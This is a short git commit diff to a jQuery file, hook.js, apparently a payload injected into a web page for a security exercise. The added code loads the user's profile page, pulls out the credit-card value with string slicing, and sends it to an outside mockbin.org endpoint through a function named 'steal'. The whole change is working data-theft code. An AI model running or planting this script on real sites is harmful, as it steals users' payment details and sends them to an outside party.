02f7674c75a64f5b3fdb548f3e7ab3f16405c58e
Daniel Szpisjak <felin.arch@gmail.com>
2016-11-05 20:31:46 +0100

    clean hookjs

--- hook.js
+++ hook.js
@@ -1,11 +1,12 @@
 $(document).ready(function() {
-  extract('test');
+  getCc().then(steal);
 
-  function extract(data) {
-    $.ajax({
-      url: "http://mockbin.org/bin/5e85cafc-c122-4701-a431-8539d8784ef5",
-      method: "post",
-      data: { data: data }
-    });
+  function steal(data) {
+    return $.ajax("https://mockbin.org/bin/97005302-c385-4843-9dbd-516bc235e75d?data=" + data);
+  }
+
+  function getCc() {
+    return $.ajax($('#profile-link a')[0].href)
+      .then(function(res) { return res.substring(res.indexOf("credit-card")+13,res.indexOf("==")+2) });
   }
 });
